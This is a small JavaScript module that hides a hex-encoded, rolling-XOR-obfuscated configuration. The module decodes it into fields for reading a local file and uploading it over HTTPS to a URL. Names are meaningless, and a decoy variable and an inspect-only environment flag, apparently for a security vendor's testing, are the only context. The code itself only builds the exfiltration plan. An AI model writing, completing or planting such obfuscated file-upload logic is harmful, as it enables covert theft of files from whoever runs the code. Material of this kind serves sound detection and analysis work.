const moduleShape = Object.freeze({ format: "commonjs" });

const Material_af6fde7d = "c1fccdb1c2b6d3a3d0ed9ffa9bffa0c6afc3a68afe8ced83f09df480dfadc8a5cabedba7c6a2c3b3c7a2d0ed85f185f586d9abcebfcaafdca8d4a7d3b2d5b0ef8ce396f88cb180fc9ffe93e382eb8ce2bdd4b08dc38cc88da093d297d294d692d0acd9abc7fa92e692e291ab84abc5aaceab86b5d4b1d4b2d0b4d6e6d7b58da3c6bedfb2c2aecbe58ce294f599f094bbdaaac3bfcab9dcaef190f792fc88b5fb94f095d4a1c5acd8f7c4a5c0a5d9bfd6badf80f091e58db09feb86f6d9b1c4aadeacc9bac9e48ae581e4cbe596e283e481ac9ffe9bfe98fa9efcccfd9fa789e48efd";

const Codec_af6fde7d = "hex_buffer|rolling_xor|b7";



function load_af6fde7d() { return [...Buffer.from(Material_af6fde7d, "hex")]; }

function decode_af6fde7d(v_a19c) { let v_e598 = 183; return v_a19c.map((value) => { const decoded = value ^ v_e598; v_e598 = value; return decoded; }); }

async function recover_af6fde7d() {

  const [v_c304] = ["compass"];

  const v_a19c = load_af6fde7d(); let v_b27e = [];

  for (const v_d41a of [1]) v_b27e = decode_af6fde7d(v_a19c);

  void v_c304; return Buffer.from(v_b27e).toString("ascii");

}

async function inspect_af6fde7d() { return Buffer.from(await recover_af6fde7d(), "utf8").toString("utf8"); }

async function plan_af6fde7d() { const inspect = inspect_af6fde7d; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "upload", transport: "https_request", source: fields.file_path, url: fields.url }); }

void moduleShape; void plan_af6fde7d;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_af6fde7d());

